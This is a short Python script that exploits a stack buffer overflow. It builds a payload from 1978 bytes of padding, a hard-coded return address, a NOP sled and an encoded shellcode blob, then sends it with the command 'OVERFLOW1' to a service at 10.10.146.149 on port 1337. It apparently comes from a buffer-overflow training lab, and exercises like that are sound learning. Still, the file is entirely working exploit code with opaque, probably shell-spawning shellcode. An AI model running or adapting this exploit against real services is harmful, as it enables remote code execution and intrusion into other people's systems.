#!/usr/bin/python3
import socket

buf =  b""
buf += b"\xb8\xbb\x9c\xee\x95\xdb\xd8\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\xf8\x92\x0c"
buf += b"\x60\x02\x42\x52\x8b\xfa\x93\x33\x05\x1f\xa2\x73\x71"
buf += b"\x54\x95\x43\xf1\x38\x1a\x2f\x57\xa8\xa9\x5d\x70\xdf"
buf += b"\x1a\xeb\xa6\xee\x9b\x40\x9a\x71\x18\x9b\xcf\x51\x21"
buf += b"\x54\x02\x90\x66\x89\xef\xc0\x3f\xc5\x42\xf4\x34\x93"
buf += b"\x5e\x7f\x06\x35\xe7\x9c\xdf\x34\xc6\x33\x6b\x6f\xc8"
buf += b"\xb2\xb8\x1b\x41\xac\xdd\x26\x1b\x47\x15\xdc\x9a\x81"
buf += b"\x67\x1d\x30\xec\x47\xec\x48\x29\x6f\x0f\x3f\x43\x93"
buf += b"\xb2\x38\x90\xe9\x68\xcc\x02\x49\xfa\x76\xee\x6b\x2f"
buf += b"\xe0\x65\x67\x84\x66\x21\x64\x1b\xaa\x5a\x90\x90\x4d"
buf += b"\x8c\x10\xe2\x69\x08\x78\xb0\x10\x09\x24\x17\x2c\x49"
buf += b"\x87\xc8\x88\x02\x2a\x1c\xa1\x49\x23\xd1\x88\x71\xb3"
buf += b"\x7d\x9a\x02\x81\x22\x30\x8c\xa9\xab\x9e\x4b\xcd\x81"
buf += b"\x67\xc3\x30\x2a\x98\xca\xf6\x7e\xc8\x64\xde\xfe\x83"
buf += b"\x74\xdf\x2a\x03\x24\x4f\x85\xe4\x94\x2f\x75\x8d\xfe"
buf += b"\xbf\xaa\xad\x01\x6a\xc3\x44\xf8\xfd\xe6\x93\x33\x0f"
buf += b"\x9e\xa1\x33\xfe\x03\x2f\xd5\x6a\xac\x79\x4e\x03\x55"
buf += b"\x20\x04\xb2\x9a\xfe\x61\xf4\x11\x0d\x96\xbb\xd1\x78"
buf += b"\x84\x2c\x12\x37\xf6\xfb\x2d\xed\x9e\x60\xbf\x6a\x5e"
buf += b"\xee\xdc\x24\x09\xa7\x13\x3d\xdf\x55\x0d\x97\xfd\xa7"
buf += b"\xcb\xd0\x45\x7c\x28\xde\x44\xf1\x14\xc4\x56\xcf\x95"
buf += b"\x40\x02\x9f\xc3\x1e\xfc\x59\xba\xd0\x56\x30\x11\xbb"
buf += b"\x3e\xc5\x59\x7c\x38\xca\xb7\x0a\xa4\x7b\x6e\x4b\xdb"
buf += b"\xb4\xe6\x5b\xa4\xa8\x96\xa4\x7f\x69\xb6\x46\x55\x84"
buf += b"\x5f\xdf\x3c\x25\x02\xe0\xeb\x6a\x3b\x63\x19\x13\xb8"
buf += b"\x7b\x68\x16\x84\x3b\x81\x6a\x95\xa9\xa5\xd9\x96\xfb"
returnAdd = b"\xaf\x11\x50\x62"
NOP = b"\x90" * 16

buffer = b"A" * 1978 + returnAdd + b"C"*4 +  NOP + buf 



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.10.146.149',1337))
resp = s.recv(1024)
print(resp)


s.send(b"OVERFLOW1 " + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	
